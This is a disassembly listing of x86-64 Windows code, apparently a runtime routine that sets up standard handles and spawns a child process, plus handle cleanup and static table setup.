    6d8caf2a:	4c 89 d7             	mov    %r10,%rdi
    6d8caf2d:	48 89 d1             	mov    %rdx,%rcx
    6d8caf30:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8caf35:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8caf37:	74 06                	je     0x6d8caf3f
    6d8caf39:	49 8b 01             	mov    (%r9),%rax
    6d8caf3c:	48 ff c0             	inc    %rax
    6d8caf3f:	48 01 c5             	add    %rax,%rbp
    6d8caf42:	e9 67 ff ff ff       	jmp    0x6d8caeae
    6d8caf47:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
    6d8caf4c:	4c 89 e8             	mov    %r13,%rax
    6d8caf4f:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
    6d8caf54:	0f 28 44 24 30       	movaps 0x30(%rsp),%xmm0
    6d8caf59:	41 0f 11 45 00       	movups %xmm0,0x0(%r13)
    6d8caf5e:	48 83 c4 48          	add    $0x48,%rsp
    6d8caf62:	5b                   	pop    %rbx
    6d8caf63:	5e                   	pop    %rsi
    6d8caf64:	5f                   	pop    %rdi
    6d8caf65:	5d                   	pop    %rbp
    6d8caf66:	41 5c                	pop    %r12
    6d8caf68:	41 5d                	pop    %r13
    6d8caf6a:	41 5e                	pop    %r14
    6d8caf6c:	41 5f                	pop    %r15
    6d8caf6e:	c3                   	ret
    6d8caf6f:	53                   	push   %rbx
    6d8caf70:	48 83 ec 20          	sub    $0x20,%rsp
    6d8caf74:	48 89 cb             	mov    %rcx,%rbx
    6d8caf77:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    6d8caf7b:	48 85 c9             	test   %rcx,%rcx
    6d8caf7e:	74 0d                	je     0x6d8caf8d
    6d8caf80:	e8 85 fa ff ff       	call   0x6d8caa0a
    6d8caf85:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    6d8caf8c:	00 
    6d8caf8d:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    6d8caf91:	48 85 c9             	test   %rcx,%rcx
    6d8caf94:	74 0d                	je     0x6d8cafa3
    6d8caf96:	e8 6f fa ff ff       	call   0x6d8caa0a
    6d8caf9b:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
    6d8cafa2:	00 
    6d8cafa3:	48 83 c4 20          	add    $0x20,%rsp
    6d8cafa7:	5b                   	pop    %rbx
    6d8cafa8:	c3                   	ret
    6d8cafa9:	53                   	push   %rbx
    6d8cafaa:	48 83 ec 20          	sub    $0x20,%rsp
    6d8cafae:	f6 41 4d 10          	testb  $0x10,0x4d(%rcx)
    6d8cafb2:	48 89 cb             	mov    %rcx,%rbx
    6d8cafb5:	75 54                	jne    0x6d8cb00b
    6d8cafb7:	48 8b 49 30          	mov    0x30(%rcx),%rcx
    6d8cafbb:	48 85 c9             	test   %rcx,%rcx
    6d8cafbe:	74 07                	je     0x6d8cafc7
    6d8cafc0:	e8 bc f5 ff ff       	call   0x6d8ca581
    6d8cafc5:	eb 15                	jmp    0x6d8cafdc
    6d8cafc7:	48 63 4b 18          	movslq 0x18(%rbx),%rcx
    6d8cafcb:	83 f9 04             	cmp    $0x4,%ecx
    6d8cafce:	7e 0c                	jle    0x6d8cafdc
    6d8cafd0:	e8 35 fa ff ff       	call   0x6d8caa0a
    6d8cafd5:	c7 43 18 ff ff ff ff 	movl   $0xffffffff,0x18(%rbx)
    6d8cafdc:	48 63 4b 20          	movslq 0x20(%rbx),%rcx
    6d8cafe0:	39 4b 1c             	cmp    %ecx,0x1c(%rbx)
    6d8cafe3:	74 11                	je     0x6d8caff6
    6d8cafe5:	83 f9 04             	cmp    $0x4,%ecx
    6d8cafe8:	7e 0c                	jle    0x6d8caff6
    6d8cafea:	e8 1b fa ff ff       	call   0x6d8caa0a
    6d8cafef:	c7 43 20 ff ff ff ff 	movl   $0xffffffff,0x20(%rbx)
    6d8caff6:	48 63 4b 1c          	movslq 0x1c(%rbx),%rcx
    6d8caffa:	83 f9 04             	cmp    $0x4,%ecx
    6d8caffd:	7e 0c                	jle    0x6d8cb00b
    6d8cafff:	e8 06 fa ff ff       	call   0x6d8caa0a
    6d8cb004:	c7 43 1c ff ff ff ff 	movl   $0xffffffff,0x1c(%rbx)
    6d8cb00b:	48 89 d9             	mov    %rbx,%rcx
    6d8cb00e:	48 83 c4 20          	add    $0x20,%rsp
    6d8cb012:	5b                   	pop    %rbx
    6d8cb013:	e9 57 ff ff ff       	jmp    0x6d8caf6f
    6d8cb018:	41 57                	push   %r15
    6d8cb01a:	41 56                	push   %r14
    6d8cb01c:	41 55                	push   %r13
    6d8cb01e:	41 54                	push   %r12
    6d8cb020:	55                   	push   %rbp
    6d8cb021:	57                   	push   %rdi
    6d8cb022:	56                   	push   %rsi
    6d8cb023:	53                   	push   %rbx
    6d8cb024:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
    6d8cb02b:	31 c0                	xor    %eax,%eax
    6d8cb02d:	8b b4 24 98 01 00 00 	mov    0x198(%rsp),%esi
    6d8cb034:	48 8d ac 24 b8 00 00 	lea    0xb8(%rsp),%rbp
    6d8cb03b:	00 
    6d8cb03c:	49 89 cc             	mov    %rcx,%r12
    6d8cb03f:	b9 1a 00 00 00       	mov    $0x1a,%ecx
    6d8cb044:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
    6d8cb04b:	00 00 00 00 00 
    6d8cb050:	48 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%rbx
    6d8cb057:	00 
    6d8cb058:	48 89 ef             	mov    %rbp,%rdi
    6d8cb05b:	49 89 d7             	mov    %rdx,%r15
    6d8cb05e:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
    6d8cb065:	00 00 00 00 00 
    6d8cb06a:	f3 ab                	rep stos %eax,(%rdi)
    6d8cb06c:	48 89 df             	mov    %rbx,%rdi
    6d8cb06f:	b9 06 00 00 00       	mov    $0x6,%ecx
    6d8cb074:	ba 50 00 00 00       	mov    $0x50,%edx
    6d8cb079:	f3 ab                	rep stos %eax,(%rdi)
    6d8cb07b:	48 8d 0d fe 3f 10 00 	lea    0x103ffe(%rip),%rcx        # 0x6d9cf080
    6d8cb082:	4d 89 c5             	mov    %r8,%r13
    6d8cb085:	4d 89 ce             	mov    %r9,%r14
    6d8cb088:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
    6d8cb08d:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
    6d8cb094:	00 00 00 00 00 
    6d8cb099:	e8 b7 8d ff ff       	call   0x6d8c3e55
    6d8cb09e:	48 89 c3             	mov    %rax,%rbx
    6d8cb0a1:	48 8d 05 98 3f 10 00 	lea    0x103f98(%rip),%rax        # 0x6d9cf040
    6d8cb0a8:	40 88 73 4d          	mov    %sil,0x4d(%rbx)
    6d8cb0ac:	48 89 03             	mov    %rax,(%rbx)
    6d8cb0af:	89 f0                	mov    %esi,%eax
    6d8cb0b1:	24 10                	and    $0x10,%al
    6d8cb0b3:	c6 43 4c 01          	movb   $0x1,0x4c(%rbx)
    6d8cb0b7:	c7 84 24 b8 00 00 00 	movl   $0x68,0xb8(%rsp)
    6d8cb0be:	68 00 00 00 
    6d8cb0c2:	88 44 24 67          	mov    %al,0x67(%rsp)
    6d8cb0c6:	74 4f                	je     0x6d8cb117
    6d8cb0c8:	48 8b 3d 21 d5 0e 00 	mov    0xed521(%rip),%rdi        # 0x6d9b85f0
    6d8cb0cf:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
    6d8cb0d4:	ff 17                	call   *(%rdi)
    6d8cb0d6:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
    6d8cb0db:	48 89 84 24 18 01 00 	mov    %rax,0x118(%rsp)
    6d8cb0e2:	00 
    6d8cb0e3:	ff 17                	call   *(%rdi)
    6d8cb0e5:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
    6d8cb0ea:	48 89 84 24 08 01 00 	mov    %rax,0x108(%rsp)
    6d8cb0f1:	00 
    6d8cb0f2:	ff 17                	call   *(%rdi)
    6d8cb0f4:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
    6d8cb0fb:	00 
    6d8cb0fc:	48 89 84 24 10 01 00 	mov    %rax,0x110(%rsp)
    6d8cb103:	00 
    6d8cb104:	89 43 1c             	mov    %eax,0x1c(%rbx)
    6d8cb107:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
    6d8cb10e:	00 
    6d8cb10f:	89 53 18             	mov    %edx,0x18(%rbx)
    6d8cb112:	e9 24 01 00 00       	jmp    0x6d8cb23b
    6d8cb117:	c7 84 24 f4 00 00 00 	movl   $0x100,0xf4(%rsp)
    6d8cb11e:	00 01 00 00 
    6d8cb122:	40 f6 c6 20          	test   $0x20,%sil
    6d8cb126:	4c 8d 84 24 88 00 00 	lea    0x88(%rsp),%r8
    6d8cb12d:	00 
    6d8cb12e:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
    6d8cb135:	00 
    6d8cb136:	74 1a                	je     0x6d8cb152
    6d8cb138:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
    6d8cb13d:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
    6d8cb144:	00 
    6d8cb145:	48 89 e9             	mov    %rbp,%rcx
    6d8cb148:	e8 ce f9 ff ff       	call   0x6d8cab1b
    6d8cb14d:	e9 cb 00 00 00       	jmp    0x6d8cb21d
    6d8cb152:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
    6d8cb156:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
    6d8cb15b:	e8 00 f9 ff ff       	call   0x6d8caa60
    6d8cb160:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
    6d8cb165:	48 8d 55 58          	lea    0x58(%rbp),%rdx
    6d8cb169:	4c 89 c1             	mov    %r8,%rcx
    6d8cb16c:	e8 ef f8 ff ff       	call   0x6d8caa60
    6d8cb171:	40 f6 c6 08          	test   $0x8,%sil
    6d8cb175:	48 8b 3d c4 d4 0e 00 	mov    0xed4c4(%rip),%rdi        # 0x6d9b8640
    6d8cb17c:	75 37                	jne    0x6d8cb1b5
    6d8cb17e:	48 8d 55 60          	lea    0x60(%rbp),%rdx
    6d8cb182:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
    6d8cb189:	00 
    6d8cb18a:	e8 d1 f8 ff ff       	call   0x6d8caa60
    6d8cb18f:	45 31 c0             	xor    %r8d,%r8d
    6d8cb192:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cb197:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
    6d8cb19e:	00 
    6d8cb19f:	ff 17                	call   *(%rdi)
    6d8cb1a1:	85 c0                	test   %eax,%eax
    6d8cb1a3:	75 30                	jne    0x6d8cb1d5
    6d8cb1a5:	e8 1b d8 ff ff       	call   0x6d8c89c5
    6d8cb1aa:	31 d2                	xor    %edx,%edx
    6d8cb1ac:	89 c1                	mov    %eax,%ecx
    6d8cb1ae:	e8 dd d7 ff ff       	call   0x6d8c8990
    6d8cb1b3:	eb 20                	jmp    0x6d8cb1d5
    6d8cb1b5:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
    6d8cb1bc:	00 
    6d8cb1bd:	48 89 84 24 18 01 00 	mov    %rax,0x118(%rsp)
    6d8cb1c4:	00 
    6d8cb1c5:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
    6d8cb1cc:	00 
    6d8cb1cd:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
    6d8cb1d4:	00 
    6d8cb1d5:	45 31 c0             	xor    %r8d,%r8d
    6d8cb1d8:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cb1dd:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
    6d8cb1e4:	00 
    6d8cb1e5:	ff 17                	call   *(%rdi)
    6d8cb1e7:	85 c0                	test   %eax,%eax
    6d8cb1e9:	75 0e                	jne    0x6d8cb1f9
    6d8cb1eb:	e8 d5 d7 ff ff       	call   0x6d8c89c5
    6d8cb1f0:	31 d2                	xor    %edx,%edx
    6d8cb1f2:	89 c1                	mov    %eax,%ecx
    6d8cb1f4:	e8 97 d7 ff ff       	call   0x6d8c8990
    6d8cb1f9:	45 31 c0             	xor    %r8d,%r8d
    6d8cb1fc:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cb201:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
    6d8cb208:	00 
    6d8cb209:	ff 17                	call   *(%rdi)
    6d8cb20b:	85 c0                	test   %eax,%eax
    6d8cb20d:	75 0e                	jne    0x6d8cb21d
    6d8cb20f:	e8 b1 d7 ff ff       	call   0x6d8c89c5
    6d8cb214:	31 d2                	xor    %edx,%edx
    6d8cb216:	89 c1                	mov    %eax,%ecx
    6d8cb218:	e8 73 d7 ff ff       	call   0x6d8c8990
    6d8cb21d:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
    6d8cb224:	00 
    6d8cb225:	89 43 18             	mov    %eax,0x18(%rbx)
    6d8cb228:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
    6d8cb22f:	00 
    6d8cb230:	89 43 1c             	mov    %eax,0x1c(%rbx)
    6d8cb233:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
    6d8cb23a:	00 
    6d8cb23b:	40 f6 c6 04          	test   $0x4,%sil
    6d8cb23f:	89 43 20             	mov    %eax,0x20(%rbx)
    6d8cb242:	4c 89 e1             	mov    %r12,%rcx
    6d8cb245:	75 0e                	jne    0x6d8cb255
    6d8cb247:	4d 89 f0             	mov    %r14,%r8
    6d8cb24a:	4c 89 ea             	mov    %r13,%rdx
    6d8cb24d:	e8 31 fb ff ff       	call   0x6d8cad83
    6d8cb252:	48 89 c1             	mov    %rax,%rcx
    6d8cb255:	e8 66 f7 ff ff       	call   0x6d8ca9c0
    6d8cb25a:	45 31 ed             	xor    %r13d,%r13d
    6d8cb25d:	4d 85 ff             	test   %r15,%r15
    6d8cb260:	49 89 c6             	mov    %rax,%r14
    6d8cb263:	74 11                	je     0x6d8cb276
    6d8cb265:	49 83 3f 00          	cmpq   $0x0,(%r15)
    6d8cb269:	7e 0b                	jle    0x6d8cb276
    6d8cb26b:	4c 89 f9             	mov    %r15,%rcx
    6d8cb26e:	e8 4d f7 ff ff       	call   0x6d8ca9c0
    6d8cb273:	49 89 c5             	mov    %rax,%r13
    6d8cb276:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
    6d8cb27a:	31 ff                	xor    %edi,%edi
    6d8cb27c:	48 83 bc 24 90 01 00 	cmpq   $0x0,0x190(%rsp)
    6d8cb283:	00 00 
    6d8cb285:	74 1c                	je     0x6d8cb2a3
    6d8cb287:	48 8b 94 24 90 01 00 	mov    0x190(%rsp),%rdx
    6d8cb28e:	00 
    6d8cb28f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
    6d8cb294:	e8 5a fb ff ff       	call   0x6d8cadf3
    6d8cb299:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
    6d8cb29e:	4c 8b 7c 24 78       	mov    0x78(%rsp),%r15
    6d8cb2a3:	40 f6 c6 01          	test   $0x1,%sil
    6d8cb2a7:	74 2e                	je     0x6d8cb2d7
    6d8cb2a9:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
    6d8cb2b0:	00 00 00 00 00 
    6d8cb2b5:	4c 89 f1             	mov    %r14,%rcx
    6d8cb2b8:	e8 70 8b ff ff       	call   0x6d8c3e2d
    6d8cb2bd:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
    6d8cb2c4:	00 
    6d8cb2c5:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cb2ca:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
    6d8cb2d1:	00 
    6d8cb2d2:	e8 a7 67 ff ff       	call   0x6d8c1a7e
    6d8cb2d7:	4c 89 f1             	mov    %r14,%rcx
    6d8cb2da:	e8 96 65 ff ff       	call   0x6d8c1875
    6d8cb2df:	48 85 ff             	test   %rdi,%rdi
    6d8cb2e2:	49 89 c6             	mov    %rax,%r14
    6d8cb2e5:	74 0d                	je     0x6d8cb2f4
    6d8cb2e7:	4c 89 fa             	mov    %r15,%rdx
    6d8cb2ea:	48 89 f9             	mov    %rdi,%rcx
    6d8cb2ed:	e8 b6 63 ff ff       	call   0x6d8c16a8
    6d8cb2f2:	eb 07                	jmp    0x6d8cb2fb
    6d8cb2f4:	31 c9                	xor    %ecx,%ecx
    6d8cb2f6:	e8 7a 65 ff ff       	call   0x6d8c1875
    6d8cb2fb:	4c 89 e9             	mov    %r13,%rcx
    6d8cb2fe:	49 89 c7             	mov    %rax,%r15
    6d8cb301:	e8 6f 65 ff ff       	call   0x6d8c1875
    6d8cb306:	89 f2                	mov    %esi,%edx
    6d8cb308:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
    6d8cb30d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
    6d8cb312:	83 e2 40             	and    $0x40,%edx
    6d8cb315:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    6d8cb31a:	48 8b 05 af d2 0e 00 	mov    0xed2af(%rip),%rax        # 0x6d9b85d0
    6d8cb321:	80 fa 01             	cmp    $0x1,%dl
    6d8cb324:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
    6d8cb329:	19 d2                	sbb    %edx,%edx
    6d8cb32b:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
    6d8cb332:	00 
    6d8cb333:	45 31 c9             	xor    %r9d,%r9d
    6d8cb336:	45 31 c0             	xor    %r8d,%r8d
    6d8cb339:	81 e2 00 00 00 f8    	and    $0xf8000000,%edx
    6d8cb33f:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
    6d8cb344:	31 c9                	xor    %ecx,%ecx
    6d8cb346:	81 c2 20 04 00 08    	add    $0x8000420,%edx
    6d8cb34c:	89 54 24 28          	mov    %edx,0x28(%rsp)
    6d8cb350:	4c 89 f2             	mov    %r14,%rdx
    6d8cb353:	ff 10                	call   *(%rax)
    6d8cb355:	41 89 c5             	mov    %eax,%r13d
    6d8cb358:	e8 68 d6 ff ff       	call   0x6d8c89c5
    6d8cb35d:	80 7c 24 67 00       	cmpb   $0x0,0x67(%rsp)
    6d8cb362:	89 c5                	mov    %eax,%ebp
    6d8cb364:	75 63                	jne    0x6d8cb3c9
    6d8cb366:	48 8b 8c 24 08 01 00 	mov    0x108(%rsp),%rcx
    6d8cb36d:	00 
    6d8cb36e:	48 83 f9 04          	cmp    $0x4,%rcx
    6d8cb372:	7e 11                	jle    0x6d8cb385
    6d8cb374:	e8 91 f6 ff ff       	call   0x6d8caa0a
    6d8cb379:	48 c7 84 24 08 01 00 	movq   $0xffffffffffffffff,0x108(%rsp)
    6d8cb380:	00 ff ff ff ff 
    6d8cb385:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
    6d8cb38c:	00 
    6d8cb38d:	48 83 f9 04          	cmp    $0x4,%rcx
    6d8cb391:	7e 11                	jle    0x6d8cb3a4
    6d8cb393:	e8 72 f6 ff ff       	call   0x6d8caa0a
    6d8cb398:	48 c7 84 24 10 01 00 	movq   $0xffffffffffffffff,0x110(%rsp)
    6d8cb39f:	00 ff ff ff ff 
    6d8cb3a4:	40 80 e6 08          	and    $0x8,%sil
    6d8cb3a8:	75 1f                	jne    0x6d8cb3c9
    6d8cb3aa:	48 8b 8c 24 18 01 00 	mov    0x118(%rsp),%rcx
    6d8cb3b1:	00 
    6d8cb3b2:	48 83 f9 04          	cmp    $0x4,%rcx
    6d8cb3b6:	7e 11                	jle    0x6d8cb3c9
    6d8cb3b8:	e8 4d f6 ff ff       	call   0x6d8caa0a
    6d8cb3bd:	48 c7 84 24 18 01 00 	movq   $0xffffffffffffffff,0x118(%rsp)
    6d8cb3c4:	00 ff ff ff ff 
    6d8cb3c9:	48 85 ff             	test   %rdi,%rdi
    6d8cb3cc:	74 08                	je     0x6d8cb3d6
    6d8cb3ce:	48 89 f9             	mov    %rdi,%rcx
    6d8cb3d1:	e8 90 79 ff ff       	call   0x6d8c2d66
    6d8cb3d6:	45 85 ed             	test   %r13d,%r13d
    6d8cb3d9:	75 31                	jne    0x6d8cb40c
    6d8cb3db:	f6 43 4d 20          	testb  $0x20,0x4d(%rbx)
    6d8cb3df:	74 08                	je     0x6d8cb3e9
    6d8cb3e1:	48 89 d9             	mov    %rbx,%rcx
    6d8cb3e4:	e8 c0 fb ff ff       	call   0x6d8cafa9
    6d8cb3e9:	83 fd 57             	cmp    $0x57,%ebp
    6d8cb3ec:	4c 89 e2             	mov    %r12,%rdx
    6d8cb3ef:	74 05                	je     0x6d8cb3f6
    6d8cb3f1:	83 fd 02             	cmp    $0x2,%ebp
    6d8cb3f4:	75 0f                	jne    0x6d8cb405
    6d8cb3f6:	48 8d 0d 63 7d 00 00 	lea    0x7d63(%rip),%rcx        # 0x6d8d3160
    6d8cb3fd:	e8 50 a7 ff ff       	call   0x6d8c5b52
    6d8cb402:	48 89 c2             	mov    %rax,%rdx
    6d8cb405:	89 e9                	mov    %ebp,%ecx
    6d8cb407:	e8 84 d5 ff ff       	call   0x6d8c8990
    6d8cb40c:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
    6d8cb413:	00 
    6d8cb414:	c6 43 4c 00          	movb   $0x0,0x4c(%rbx)
    6d8cb418:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6d8cb41c:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
    6d8cb423:	00 
    6d8cb424:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8cb428:	48 63 84 24 b0 00 00 	movslq 0xb0(%rsp),%rax
    6d8cb42f:	00 
    6d8cb430:	48 89 43 28          	mov    %rax,0x28(%rbx)
    6d8cb434:	48 89 d8             	mov    %rbx,%rax
    6d8cb437:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
    6d8cb43e:	5b                   	pop    %rbx
    6d8cb43f:	5e                   	pop    %rsi
    6d8cb440:	5f                   	pop    %rdi
    6d8cb441:	5d                   	pop    %rbp
    6d8cb442:	41 5c                	pop    %r12
    6d8cb444:	41 5d                	pop    %r13
    6d8cb446:	41 5e                	pop    %r14
    6d8cb448:	41 5f                	pop    %r15
    6d8cb44a:	c3                   	ret
    6d8cb44b:	48 8b 05 8e d1 0e 00 	mov    0xed18e(%rip),%rax        # 0x6d9b85e0
    6d8cb452:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    6d8cb456:	48 ff 20             	rex.W jmp *(%rax)
    6d8cb459:	48 8b 41 28          	mov    0x28(%rcx),%rax
    6d8cb45d:	c3                   	ret
    6d8cb45e:	48 8b 05 eb d2 0e 00 	mov    0xed2eb(%rip),%rax        # 0x6d9b8750
    6d8cb465:	48 8d 0d d5 7b 00 00 	lea    0x7bd5(%rip),%rcx        # 0x6d8d3041
    6d8cb46c:	48 c7 05 c9 3b 10 00 	movq   $0x50,0x103bc9(%rip)        # 0x6d9cf040
    6d8cb473:	50 00 00 00 
    6d8cb477:	48 89 0d 8a 16 0f 00 	mov    %rcx,0xf168a(%rip)        # 0x6d9bcb08
    6d8cb47e:	48 8d 0d 9b 16 0f 00 	lea    0xf169b(%rip),%rcx        # 0x6d9bcb20
    6d8cb485:	48 8b 15 24 d2 0e 00 	mov    0xed224(%rip),%rdx        # 0x6d9b86b0
    6d8cb48c:	48 89 0d 55 1a 0f 00 	mov    %rcx,0xf1a55(%rip)        # 0x6d9bcee8
    6d8cb493:	48 8d 0d b6 7b 00 00 	lea    0x7bb6(%rip),%rcx        # 0x6d8d3050
    6d8cb49a:	48 89 0d 97 16 0f 00 	mov    %rcx,0xf1697(%rip)        # 0x6d9bcb38
    6d8cb4a1:	48 8d 0d a8 16 0f 00 	lea    0xf16a8(%rip),%rcx        # 0x6d9bcb50
    6d8cb4a8:	48 89 05 a9 3b 10 00 	mov    %rax,0x103ba9(%rip)        # 0x6d9cf058
    6d8cb4af:	48 8d 05 3a 16 0f 00 	lea    0xf163a(%rip),%rax        # 0x6d9bcaf0
    6d8cb4b6:	48 89 0d 33 1a 0f 00 	mov    %rcx,0xf1a33(%rip)        # 0x6d9bcef0
    6d8cb4bd:	48 8d 0d 9a 7b 00 00 	lea    0x7b9a(%rip),%rcx        # 0x6d8d305e
    6d8cb4c4:	48 89 05 15 1a 0f 00 	mov    %rax,0xf1a15(%rip)        # 0x6d9bcee0
    6d8cb4cb:	48 8b 05 fe d1 0e 00 	mov    0xed1fe(%rip),%rax        # 0x6d9b86d0
    6d8cb4d2:	4c 8d 0d 47 7c 00 00 	lea    0x7c47(%rip),%r9        # 0x6d8d3120
    6d8cb4d9:	48 89 0d 88 16 0f 00 	mov    %rcx,0xf1688(%rip)        # 0x6d9bcb68
    6d8cb4e0:	48 8d 0d 99 16 0f 00 	lea    0xf1699(%rip),%rcx        # 0x6d9bcb80
    6d8cb4e7:	48 89 0d 0a 1a 0f 00 	mov    %rcx,0xf1a0a(%rip)        # 0x6d9bcef8
    6d8cb4ee:	48 8d 0d 72 7b 00 00 	lea    0x7b72(%rip),%rcx        # 0x6d8d3067
    6d8cb4f5:	48 89 15 64 16 0f 00 	mov    %rdx,0xf1664(%rip)        # 0x6d9bcb60
    6d8cb4fc:	48 89 15 8d 16 0f 00 	mov    %rdx,0xf168d(%rip)        # 0x6d9bcb90
    6d8cb503:	48 89 0d 8e 16 0f 00 	mov    %rcx,0xf168e(%rip)        # 0x6d9bcb98
    6d8cb50a:	48 8d 0d 9f 16 0f 00 	lea    0xf169f(%rip),%rcx        # 0x6d9bcbb0
    6d8cb511:	48 89 15 a8 16 0f 00 	mov    %rdx,0xf16a8(%rip)        # 0x6d9bcbc0
    6d8cb518:	48 8d 15 52 7b 00 00 	lea    0x7b52(%rip),%rdx        # 0x6d8d3071
    6d8cb51f:	48 89 15 a2 16 0f 00 	mov    %rdx,0xf16a2(%rip)        # 0x6d9bcbc8
    6d8cb526:	48 8d 51 30          	lea    0x30(%rcx),%rdx
    6d8cb52a:	48 89 05 cf 15 0f 00 	mov    %rax,0xf15cf(%rip)        # 0x6d9bcb00
    6d8cb531:	48 89 05 f8 15 0f 00 	mov    %rax,0xf15f8(%rip)        # 0x6d9bcb30
    6d8cb538:	48 89 0d c1 19 0f 00 	mov    %rcx,0xf19c1(%rip)        # 0x6d9bcf00
    6d8cb53f:	48 c7 05 fe 3a 10 00 	movq   $0x8,0x103afe(%rip)        # 0x6d9cf048
    6d8cb546:	08 00 00 00 
    6d8cb54a:	c6 05 ff 3a 10 00 11 	movb   $0x11,0x103aff(%rip)        # 0x6d9cf050
    6d8cb551:	c6 05 98 15 0f 00 01 	movb   $0x1,0xf1598(%rip)        # 0x6d9bcaf0
    6d8cb558:	48 c7 05 95 15 0f 00 	movq   $0x8,0xf1595(%rip)        # 0x6d9bcaf8
    6d8cb55f:	08 00 00 00 
    6d8cb563:	c6 05 b6 15 0f 00 01 	movb   $0x1,0xf15b6(%rip)        # 0x6d9bcb20
    6d8cb56a:	48 c7 05 b3 15 0f 00 	movq   $0x10,0xf15b3(%rip)        # 0x6d9bcb28
    6d8cb571:	10 00 00 00 
    6d8cb575:	c6 05 d4 15 0f 00 01 	movb   $0x1,0xf15d4(%rip)        # 0x6d9bcb50
    6d8cb57c:	48 c7 05 d1 15 0f 00 	movq   $0x18,0xf15d1(%rip)        # 0x6d9bcb58
    6d8cb583:	18 00 00 00 
    6d8cb587:	c6 05 f2 15 0f 00 01 	movb   $0x1,0xf15f2(%rip)        # 0x6d9bcb80
    6d8cb58e:	48 c7 05 ef 15 0f 00 	movq   $0x1c,0xf15ef(%rip)        # 0x6d9bcb88
    6d8cb595:	1c 00 00 00 
    6d8cb599:	c6 05 10 16 0f 00 01 	movb   $0x1,0xf1610(%rip)        # 0x6d9bcbb0
    6d8cb5a0:	48 c7 05 0d 16 0f 00 	movq   $0x20,0xf160d(%rip)        # 0x6d9bcbb8
    6d8cb5a7:	20 00 00 00 
    6d8cb5ab:	48 89 15 56 19 0f 00 	mov    %rdx,0xf1956(%rip)        # 0x6d9bcf08
    6d8cb5b2:	48 8d 15 c5 7a 00 00 	lea    0x7ac5(%rip),%rdx        # 0x6d8d307e
    6d8cb5b9:	48 89 05 30 16 0f 00 	mov    %rax,0xf1630(%rip)        # 0x6d9bcbf0
    6d8cb5c0:	48 8d 05 b4 7a 00 00 	lea    0x7ab4(%rip),%rax        # 0x6d8d307b
    6d8cb5c7:	48 89 05 2a 16 0f 00 	mov    %rax,0xf162a(%rip)        # 0x6d9bcbf8
    6d8cb5ce:	48 8d 41 60          	lea    0x60(%rcx),%rax
    6d8cb5d2:	48 89 05 37 19 0f 00 	mov    %rax,0xf1937(%rip)        # 0x6d9bcf10
    6d8cb5d9:	48 8b 05 90 d1 0e 00 	mov    0xed190(%rip),%rax        # 0x6d9b8770
    6d8cb5e0:	48 89 15 41 16 0f 00 	mov    %rdx,0xf1641(%rip)        # 0x6d9bcc28
    6d8cb5e7:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
    6d8cb5ee:	48 81 c1 c0 00 00 00 	add    $0xc0,%rcx
    6d8cb5f5:	48 89 15 1c 19 0f 00 	mov    %rdx,0xf191c(%rip)        # 0x6d9bcf18
    6d8cb5fc:	48 8d 15 84 7a 00 00 	lea    0x7a84(%rip),%rdx        # 0x6d8d3087
    6d8cb603:	48 89 15 4e 16 0f 00 	mov    %rdx,0xf164e(%rip)        # 0x6d9bcc58
    6d8cb60a:	48 8d 91 c0 00 00 00 	lea    0xc0(%rcx),%rdx
